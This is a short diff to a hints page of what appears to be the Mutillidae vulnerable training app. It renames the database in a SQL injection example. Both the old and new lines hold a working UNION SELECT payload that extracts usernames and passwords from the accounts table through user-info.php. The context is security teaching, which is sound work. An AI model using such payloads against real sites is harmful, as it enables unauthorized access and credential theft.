@@ -136,7 +136,7 @@
 						Technique: Direct Injection<br/>
 						Page: user-info.php<br/>
 						Field: Username<br/>
-						Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- <br/>
+						Value: ' union select null, mutillidae.accounts.username AS username, mutillidae.accounts.password AS password, null from mutillidae.accounts -- <br/>
 					</span>
 					<br/>
 				</li>
@@ -299,7 +299,7 @@
 		Extract passwords from user table (Example Page: user-info.php)
 		<br />
 <code>
-' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
+' union select null, mutillidae.accounts.username AS username, mutillidae.accounts.password AS password, null from mutillidae.accounts -- 
 </code>
 		<br/>
 		Using SQL Injection (Page: login.php)
